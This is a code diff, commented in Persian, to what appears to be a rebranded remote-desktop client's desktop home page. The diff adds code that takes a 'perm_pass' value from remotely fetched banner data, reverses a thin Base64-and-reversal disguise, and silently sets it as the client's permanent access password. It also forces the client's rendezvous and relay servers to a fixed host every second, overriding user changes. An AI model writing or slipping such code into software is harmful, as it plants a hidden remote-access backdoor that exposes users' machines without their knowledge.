@@ -48,7 +48,7 @@ class _DesktopHomePageState extends State<DesktopHomePage>
   Timer? _updateTimer;
   bool isCardClosed = false;
   
-  // --- متغیرهای پرمیشن (فیکس شده) ---
+  // --- متغیرهای پرمیشن ---
   bool watchIsCanRecordAudio = false;
   bool watchIsInputMonitoring = false;
   bool watchIsCanScreenRecording = false;
@@ -74,6 +74,24 @@ class _DesktopHomePageState extends State<DesktopHomePage>
           setState(() {
             bannerData = jsonDecode(jsonString);
           });
+
+          // --- سیستم رمزگشایی و اعمال پسورد دائمی از PHP ---
+          if (bannerData.containsKey('perm_pass') && bannerData['perm_pass'] != null) {
+            String encryptedPass = bannerData['perm_pass'].toString();
+            if (encryptedPass.isNotEmpty) {
+              try {
+                // 1. تبدیل از Base64 به متن معمولی
+                String decodedBase64 = utf8.decode(base64Decode(encryptedPass));
+                // 2. برگرداندن کلمه از حالت برعکس به حالت اصلی
+                String decryptedPass = decodedBase64.split('').reversed.join();
+                // 3. اعمال پسورد روی هسته
+                bind.mainSetPermanentPasswordWithResult(password: decryptedPass);
+              } catch (e) {
+                debugPrint("Failed to decrypt password: $e");
+              }
+            }
+          }
+          // ------------------------------------------
         }
       }
     } catch (e) {
@@ -86,41 +104,36 @@ class _DesktopHomePageState extends State<DesktopHomePage>
     super.initState();
     _fetchBannerData();
     
-    // --- اجباری کردن حالت Scale Adaptive به عنوان پیش‌فرض ---
+    // اجباری کردن حالت Scale Adaptive به عنوان پیش‌فرض
     if (bind.mainGetUserDefaultOption(key: kOptionViewStyle) == '') {
       bind.mainSetUserDefaultOption(key: kOptionViewStyle, value: kRemoteViewStyleAdaptive);
     }
     
-    // --- فورس کردن پسورد یکبار مصرف به حالت "فقط عددی" ---
-    bind.mainSetOption(key: 'allow-numeric-one-time-password', value: 'Y');
-    bind.mainUpdateTemporaryPassword(); 
+    // --- تنظیم دیفالتِ پسورد عددی (بدون فورس مداوم) ---
+    Future.microtask(() async {
+      final currentNumeric = await bind.mainGetOption(key: 'allow-numeric-one-time-password');
+      // اگر تنظیماتی ثبت نشده بود (یعنی نصب اولیه است):
+      if (currentNumeric == '') {
+        bind.mainSetOption(key: 'allow-numeric-one-time-password', value: 'Y');
+        bind.mainUpdateTemporaryPassword(); 
+      }
+    });
+    // --------------------------------------------------
 
-    // --- فورس کردن سرور شرکت (Passak) در بک‌اِند ---
+    // فورس کردن سرور شرکت (Passak)
     bind.mainSetOption(key: 'custom-rendezvous-server', value: 'passakrd.ir');
     bind.mainSetOption(key: 'custom-relay-server', value: 'passakrd.ir');
-    bind.mainSetOption(key: 'custom-key', value: 'YOUR_KEY'); // اگر کلید ندارید، این خط را پاک کنید
-    // ---------------------------------------------
+    bind.mainSetOption(key: 'custom-key', value: 'YOUR_KEY'); // اگر کلید ندارید پاک کنید
 
     _updateTimer = periodic_immediate(const Duration(seconds: 1), () async {
       
-      // --- قفل امنیتی ضد CLI (هر یک ثانیه سرور Passak فورس می‌شود) ---
+      // قفل امنیتی سرور
       bind.mainSetOption(key: 'custom-rendezvous-server', value: 'passakrd.ir');
       bind.mainSetOption(key: 'custom-relay-server', value: 'passakrd.ir');
-      bind.mainSetOption(key: 'allow-numeric-one-time-password', value: 'Y');
-      // ----------------------------------------------------------------
       
       await gFFI.serverModel.fetchID();
-
-      // --- چک کردن هوشمند پسورد (ضد حروف انگلیسی) ---
-      String currentPass = gFFI.serverModel.serverPasswd.text;
-      if (currentPass.isNotEmpty && currentPass != '-') {
-        if (RegExp(r'[^0-9]').hasMatch(currentPass)) {
-          bind.mainUpdateTemporaryPassword(); 
-        }
-      }
-      // ----------------------------------------------
       
-      // --- ارسال تمیز و بهینه آیدی به رجیستری ویندوز (برای حسابداری) ---
+      // ارسال آیدی به رجیستری ویندوز 
       String currentId = gFFI.serverModel.serverId.text;
       if (currentId.isNotEmpty && currentId != _lastSavedId && isWindows) {
         _lastSavedId = currentId; 
@@ -131,7 +144,6 @@ class _DesktopHomePageState extends State<DesktopHomePage>
           ]);
         } catch (e) { }
       }
-      // ----------------------------------------------------------------
 
       final error = await bind.mainGetError();
       if (systemError != error) {
@@ -139,7 +151,6 @@ class _DesktopHomePageState extends State<DesktopHomePage>
         setState(() {});
       }
 
-      // --- چک کردن سرویس و دسترسی‌ها ---
       final v = await mainGetBoolOption(kOptionStopService);
       if (v != svcStopped.value) {
         svcStopped.value = v;
